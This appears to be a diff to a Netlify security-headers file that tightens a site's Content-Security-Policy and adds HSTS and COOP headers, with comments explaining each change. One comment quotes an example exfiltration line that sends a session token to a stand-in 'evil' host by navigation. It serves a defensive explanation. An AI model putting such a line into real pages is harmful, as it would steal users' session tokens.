@@ -16,17 +16,32 @@
 #      - frame-ancestors 'none' + X-Frame-Options: the site can't be framed, closing the
 #        clickjacking attack where an invisible iframe of turnitin.html/pricing.html sits
 #        under a decoy button and a single click burns a scan or starts a payment.
-#      - connect-src: the page may only talk to its own API, so an injected script can't
-#        exfiltrate the localStorage session token to an arbitrary host.
+#      - script-src WITHOUT 'unsafe-inline': an injected <script> or onclick="" doesn't
+#        run at all. This is the header that earns its keep, and it only works because the
+#        site has no inline script left — index.html's redirect is js/index-redirect.js,
+#        narrator.html's gate call is js/narrator-gate.js, and login.html's theme button is
+#        bound by id in js/theme.js. Adding one inline handler anywhere silently breaks
+#        that page, so don't; put it in a file.
+#      - connect-src: fetch/XHR/WebSocket may only reach our own API. Note what this does
+#        NOT do: it cannot stop a script that has already run from exfiltrating the
+#        localStorage token, because a plain `location.href = 'https://evil/?t=' + token`
+#        is a NAVIGATION, and no shipping browser implements the navigate-to directive.
+#        connect-src narrows the blast radius of a compromised third-party host; keeping
+#        script out of the page in the first place is what actually protects the token.
 #      - object-src/base-uri 'none': no plugins, no <base> hijack.
+#      - COOP same-origin-allow-popups: cuts this page's window relationship with anything
+#        it opens or is opened by, WITHOUT breaking Google Sign-In, which talks to a popup
+#        it opened itself. Plain 'same-origin' would break the login button.
 #
-# 'unsafe-inline' is still permitted for script and style, because two inline scripts
-# (index.html's redirect, narrator.html's gate call) and many inline style="" attributes
-# (shell.js, humanizer.js, turnitin.js) rely on it. Moving those two scripts into files
-# lets 'unsafe-inline' come off script-src — the single highest-value follow-up, since it
-# is what would neuter an injected inline <script>. The CDN hosts (esm.sh, jsdelivr,
-# huggingface) are the Slide Narrator's runtime modules and model; they come off the day
-# those are vendored locally like ffmpeg already is.
+# 'unsafe-inline' remains on style-src only: shell.js, humanizer.js and turnitin.js all
+# write style="" attributes, and there is no injection value in a style attribute here.
+#
+# cdn.jsdelivr.net is still in script-src for one module — @huggingface/transformers in
+# js/transcribe.js, the Slide Narrator's Whisper runtime. A CDN that serves any npm
+# package on request is barely an allowlist entry, so it comes off the day that module is
+# self-hosted; jszip already is (vendor/jszip), which is why esm.sh is gone. jsdelivr also
+# stays in connect-src for @ffmpeg/core's wasm, which audio.js fetches into a blob URL —
+# that path was never script-src to begin with.
 [[headers]]
   for = "/*"
   [headers.values]
@@ -34,5 +49,9 @@
     X-Content-Type-Options = "nosniff"
     Referrer-Policy = "no-referrer"
     X-Frame-Options = "DENY"
+    # Declared rather than left to Netlify's default, which is max-age only. No preload:
+    # that pin is not something a site can walk back.
+    Strict-Transport-Security = "max-age=31536000; includeSubDomains"
+    Cross-Origin-Opener-Policy = "same-origin-allow-popups"
     Permissions-Policy = "geolocation=(), camera=(), payment=(), usb=()"
-    Content-Security-Policy = "default-src 'self'; base-uri 'none'; object-src 'none'; frame-ancestors 'none'; form-action 'self'; script-src 'self' 'unsafe-inline' https://accounts.google.com https://esm.sh https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://*.googleusercontent.com; font-src 'self' data:; media-src 'self' blob:; worker-src 'self' blob:; connect-src 'self' blob: https://api.gahumanizer.com https://accounts.google.com https://esm.sh https://cdn.jsdelivr.net https://huggingface.co https://cdn-lfs.huggingface.co; frame-src https://accounts.google.com; upgrade-insecure-requests"
+    Content-Security-Policy = "default-src 'self'; base-uri 'none'; object-src 'none'; frame-ancestors 'none'; form-action 'self'; script-src 'self' https://accounts.google.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://*.googleusercontent.com; font-src 'self' data:; media-src 'self' blob:; worker-src 'self' blob:; connect-src 'self' blob: https://api.gahumanizer.com https://accounts.google.com https://cdn.jsdelivr.net https://huggingface.co https://cdn-lfs.huggingface.co; frame-src https://accounts.google.com; upgrade-insecure-requests"
